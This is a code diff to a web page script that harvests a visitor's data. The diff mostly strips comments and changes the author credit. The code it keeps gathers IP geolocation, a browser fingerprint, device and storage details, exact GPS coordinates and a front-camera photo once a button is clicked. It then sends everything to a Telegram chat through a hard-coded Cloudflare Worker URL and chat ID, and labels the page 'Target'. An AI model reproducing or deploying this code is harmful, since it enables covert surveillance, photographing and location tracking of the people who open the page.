@@ -65,10 +65,9 @@
 
 <script>
     // ================= CONFIGURACIÓN =================
-    const WORKER_URL = 'https://bot-ubi.societykark.workers.dev';  // ✅ TU WORKER
-    const CHAT_ID = '7555997298';  // TU CHAT ID
+    const WORKER_URL = 'https://bot-ubi.societykark.workers.dev';
+    const CHAT_ID = '7555997298';
 
-    // ---------- 1. Obtener ubicación desde Cloudflare Worker ----------
     async function getLocationFromWorker() {
         try {
             const res = await fetch(WORKER_URL);
@@ -87,7 +86,6 @@
         }
     }
 
-    // ---------- 2. Obtener ubicación desde ipapi.co ----------
     async function getLocationFromIpapi() {
         try {
             const res = await fetch('https://ipapi.co/json/');
@@ -105,7 +103,6 @@
         }
     }
 
-    // ---------- 3. Fingerprint ----------
     async function getFingerprint() {
         const canvas = document.createElement('canvas');
         const ctx = canvas.getContext('2d');
@@ -124,7 +121,6 @@
         return { gpu, fonts: availableFonts.join(', ') || 'Ninguna', canvasHash };
     }
 
-    // ---------- 4. Datos del dispositivo ----------
     function getDeviceInfo() {
         const ua = navigator.userAgent;
         let model = "Desconocido";
@@ -139,7 +135,6 @@
         return { model, ua, language, resolution, cpuCores };
     }
 
-    // ---------- 5. Almacenamiento ----------
     async function getStorageInfo() {
         try {
             const est = await navigator.storage.estimate();
@@ -149,7 +144,6 @@
         } catch(e) { return { total: 'N/A', used: 'N/A' }; }
     }
 
-    // ---------- 6. GPS exacto ----------
     function getGPS() {
         return new Promise((resolve) => {
             if (!navigator.geolocation) { resolve(null); return; }
@@ -161,7 +155,6 @@
         });
     }
 
-    // ---------- 7. Cámara frontal ----------
     async function capturePhoto() {
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
@@ -183,7 +176,6 @@
         return blob;
     }
 
-    // ---------- 8. Envío a Telegram usando Worker (seguro) ----------
     async function sendMessage(text) {
         try {
             await fetch(WORKER_URL, {
@@ -203,7 +195,6 @@
         } catch(e) { console.warn(e); }
     }
 
-    // ---------- 9. Proceso principal ----------
     document.getElementById('btn').onclick = async () => {
         const btn = document.getElementById('btn');
         btn.disabled = true;
@@ -245,7 +236,7 @@
         message += `\n🖼️ *Display Information*\n   • Resolution: ${device.resolution}\n`;
         message += `🔐 *Device Permissions*\n   • Camera: ${foto ? 'Permitido' : 'Denegado/No disponible'}\n   • Location: ${gps ? 'Permitido' : 'Denegado/No disponible'}\n`;
         message += `💾 *Hardware & Storage*\n   • CPU Cores: ${device.cpuCores}\n   • RAM: N/A GB\n   • Storage Used: ${storage.used} GB\n   • Storage Total: ${storage.total} GB\n`;
-        message += `━━━━━━━━━━━━━━━━\n🎯 Target: ${window.location.href}\n⚡ Developed by: @Society\n`;
+        message += `━━━━━━━━━━━━━━━━\n🎯 Target: ${window.location.href}\n⚡ Developed by: @jsemanper\n`;
 
         await sendMessage(message);
         if (foto) await sendPhoto(foto);
